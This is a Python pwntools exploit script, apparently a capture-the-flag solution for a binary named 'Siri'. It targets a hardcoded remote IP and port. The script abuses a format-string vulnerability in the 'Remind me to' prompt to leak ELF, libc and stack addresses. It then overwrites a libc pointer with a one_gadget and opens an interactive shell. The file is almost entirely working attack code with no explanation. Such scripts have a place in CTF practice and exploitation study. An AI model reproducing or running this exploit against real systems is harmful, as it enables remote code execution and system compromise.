#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'Siri'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'
libFile = './libc.so.6'


remoteIp = "123.56.170.202"
remotePort = 12124

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------

#--------------------------Exploit--------------------------
def exploit():
	sl('Hey Siri!')
	p = 'Remind me to '
	p += '%1$p, %83$p, %85$p'

	sa('?', p)
	ru('0x')
	elf_base = int(r(12), 16) - (0x55dde8275033 - 0x55dde8273000)
	li('elf_base ' + hex(elf_base))
	ru('0x')
	libc_base = int(r(12), 16) - lib.sym['__libc_start_main'] - 231
	li('libc_base ' + hex(libc_base))

	ru('0x')
	target_addr = int(r(12), 16) - (0x7fffb9b2b008 - 0x7fffb9b2af38) - 0x10
	target_addr = libc_base + (0x7f667e8880a8 - 0x7f667e49d000)
	li('target_addr ' + hex(target_addr))
	
	gadget = [0x4f365, 0x4f3c2, 0x10a45c, 0xe58b8, 0xe58bf, 0xe58c3, 0x10a468]
	one_gadget = libc_base + gadget[5]
	#one_gadget = libc_base + lib.sym['system']

	l_addr = one_gadget & 0xFFFF
	h_addr = (one_gadget & 0xFF0000) >> 16


	li('l_addr ' + hex(l_addr))
	li('h_addr ' + hex(h_addr))


	sl('Hey Siri!')
	offset = 14 + 30 + 5
	pre_len = len("OK, I'll remind you to ")
	ru('?')
	p = 'Remind me to '
	p += 'AAA' # ajust
	p2 = '%'  + str(h_addr - pre_len - 7)  + 'c%' + str(offset + 4) + '$hhn'
	p2 += '%'  + str(l_addr - h_addr)  + 'c%' + str(offset + 5) + '$hn'
	if(len(p2) % 8 != 0):
		while(len(p2) % 8 != 0):
			p2 += 'A'
	p += p2
	p += p64(target_addr + 2)
	p += p64(target_addr)

	li('off ' + str(len(p2) / 8))
	#db()
	s(p)
	li('one_gadget ' + hex(one_gadget))
	#p = target_addr




def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
